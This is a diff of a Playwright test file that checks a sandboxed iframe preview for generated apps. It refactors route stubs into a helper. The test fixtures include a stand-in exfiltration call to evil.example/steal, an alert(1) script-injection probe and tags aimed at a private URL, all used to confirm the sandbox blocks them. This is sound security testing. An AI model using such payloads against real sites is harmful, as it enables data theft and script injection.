@@ -47,7 +47,7 @@ test.afterAll(async () => {
 });
 
 test('generated app runs, saves its own storage, and reads it before its first script after reload', async ({ page }) => {
-	await page.route('**/api/projects/*/artifact-revisions/output-one/content', route => route.fulfill({ contentType: 'text/html', body: HTML }));
+	await stubArtifactFrameDocument(page, HTML);
 	await page.goto(base);
 	const frame = page.frameLocator('iframe');
 	await frame.getByRole('textbox', { name: 'New task' }).fill('Build Caddie');
@@ -69,7 +69,7 @@ test('generated app runs, saves its own storage, and reads it before its first s
 
 test('opaque sandbox blocks parent cookies, parent DOM, network, nested frames and forms', async ({ page, context }) => {
 	await context.addCookies([{ name: 'caddie-secret', value: 'never-share-this', url: base }]);
-	await page.route('**/api/projects/*/artifact-revisions/output-one/content', route => route.fulfill({ contentType: 'text/html', body: HTML }));
+	await stubArtifactFrameDocument(page, HTML);
 	await page.goto(base);
 	await expect(page.locator('iframe')).toHaveAttribute('sandbox', 'allow-scripts allow-forms');
 	await expect(page.frameLocator('iframe').getByRole('heading')).toHaveText('My tasks');
@@ -90,7 +90,7 @@ test('opaque sandbox blocks parent cookies, parent DOM, network, nested frames a
 test('resource tags are never parsed in the parent and cannot request private app URLs', async ({ page }) => {
 	let privateReads = 0;
 	await page.route('**/api/private-resource', route => { privateReads++; return route.fulfill({ contentType: 'text/html', body: 'private' }); });
-	await page.route('**/api/projects/*/artifact-revisions/output-one/content', route => route.fulfill({ contentType: 'text/html', body: HTML + '<img src="/api/private-resource"><iframe src="/api/private-resource"></iframe>' }));
+	await stubArtifactFrameDocument(page, HTML + '<img src="/api/private-resource"><iframe src="/api/private-resource"></iframe>');
 	await page.goto(base);
 	await expect(page.frameLocator('iframe[name="caddie-interactive-preview"]').getByRole('heading')).toHaveText('My tasks');
 	const generated = page.frames().find(item => item.name() === 'caddie-interactive-preview')!;
@@ -99,7 +99,7 @@ test('resource tags are never parsed in the parent and cannot request private ap
 });
 
 test('storage bridge rejects the wrong window, wrong nonce and oversized records', async ({ page }) => {
-	await page.route('**/api/projects/*/artifact-revisions/output-one/content', route => route.fulfill({ contentType: 'text/html', body: HTML }));
+	await stubArtifactFrameDocument(page, HTML);
 	await page.goto(base);
 	await expect(page.frameLocator('iframe').getByRole('heading')).toHaveText('My tasks');
 	const generated = page.frames().find(item => item.name() === 'caddie-interactive-preview')!;
@@ -135,7 +135,8 @@ test('failed access has a visible retry; custom workflow content is fetched and 
 });
 
 test('non-HTML artifacts fail closed rather than execute as an app', async ({ page }) => {
-	await page.route('**/api/projects/*/artifact-revisions/output-one/content', route => route.fulfill({ contentType: 'text/plain', body: '<script>alert(1)</script>' }));
+	await page.route('**/api/projects/*/artifact-revisions/*/seed', route => route.fulfill({ contentType: 'application/json', body: '{"seedRef":"seed-ref"}' }));
+	await page.route('**/api/projects/*/artifact-revisions/*/document*', route => route.fulfill({ contentType: 'text/plain', body: '<script>alert(1)</script>' }));
 	await page.goto(base);
 	await expect(page.getByRole('alert')).toContainText('not an interactive app preview');
 	await expect(page.locator('iframe')).toHaveCount(0);
@@ -156,18 +157,40 @@ fetch('https://evil.example/steal').then(function () { document.querySelector('#
 load();
 </script></body></html>`;
 
+
+/**
+ * The frame document endpoints for an imported app (an artifact revision):
+ * the app's saved data goes up as a seed, and the frame document comes back
+ * over http(s) so the app sees the protocol it sees in production.
+ */
+async function stubArtifactFrameDocument(page: import('@playwright/test').Page, appHtml: string) {
+	let seed: Record<string, string> = {};
+	await page.route('**/api/projects/*/artifact-revisions/*/seed', (route) => {
+		seed = ((route.request().postDataJSON() as { storage?: Record<string, string> }).storage ?? {});
+		return route.fulfill({ contentType: 'application/json', body: JSON.stringify({ seedRef: 'seed-ref' }) });
+	});
+	await page.route('**/api/projects/*/artifact-revisions/*/document*', (route) => {
+		const nonce = new URL(route.request().url()).searchParams.get('nonce') ?? '';
+		return route.fulfill({ contentType: 'text/html', body: previewFrameDocument(appHtml, nonce, seed, false, 'web') });
+	});
+}
+
 /**
  * The frame document endpoints, as Caddie serves them: the app's saved data
  * goes up (a content-addressed seed), and the frame document comes back over
  * http(s) so the app sees the protocol it sees in production.
  */
 async function stubFrameDocument(page: import('@playwright/test').Page, appHtml: string, seed: Record<string, string> = {}) {
-	await page.route('**/api/projects/project-one/workflow/preview/output-one/seed', (route) =>
-		route.fulfill({ contentType: 'application/json', body: JSON.stringify({ seedRef: 'seed-ref' }) }),
-	);
+	// The server keeps the seed it was given and hands it back inside the frame
+	// document, exactly like the real seed/document routes do.
+	let stored: Record<string, string> = { ...seed };
+	await page.route('**/api/projects/project-one/workflow/preview/output-one/seed', (route) => {
+		stored = (route.request().postDataJSON() as { storage?: Record<string, string> }).storage ?? {};
+		return route.fulfill({ contentType: 'application/json', body: JSON.stringify({ seedRef: 'seed-ref' }) });
+	});
 	await page.route('**/api/projects/project-one/workflow/preview/output-one/document*', (route) => {
 		const nonce = new URL(route.request().url()).searchParams.get('nonce') ?? '';
-		return route.fulfill({ contentType: 'text/html', body: previewFrameDocument(appHtml, nonce, seed, true, 'web') });
+		return route.fulfill({ contentType: 'text/html', body: previewFrameDocument(appHtml, nonce, stored, true, 'web') });
 	});
 }
 
@@ -293,7 +316,7 @@ WebAssembly.instantiate(new Uint8Array(${WASM_BYTES})).then(
 </script></body></html>`;
 
 test('an app in the preview can run WebAssembly, but not JavaScript eval (owner OK, 2026-10-20)', async ({ page }) => {
-	await page.route('**/api/projects/*/artifact-revisions/output-one/content', route => route.fulfill({ contentType: 'text/html', body: WASM_HTML }));
+	await stubArtifactFrameDocument(page, WASM_HTML);
 	await page.goto(base);
 	await expect(page.frameLocator('iframe').getByRole('heading')).toHaveText('WebAssembly ran: 42, eval blocked');
 });
@@ -319,7 +342,7 @@ test('an app built by the template carries its WebAssembly file into the preview
 		execFileSync(command!, args, { cwd: app, stdio: 'pipe' });
 		expect(readdirSync(join(app, 'dist'))).toEqual(['main.js']); // nothing left behind for Caddie to drop
 		const html = previewAppDocument({ js: readFileSync(join(app, 'dist', 'main.js'), 'utf8'), css: '' });
-		await page.route('**/api/projects/*/artifact-revisions/output-one/content', route => route.fulfill({ contentType: 'text/html', body: html }));
+		await stubArtifactFrameDocument(page, html);
 		await page.goto(base);
 		await expect(page.frameLocator('iframe').locator('#root')).toHaveText('WebAssembly ran: 42');
 	} finally {
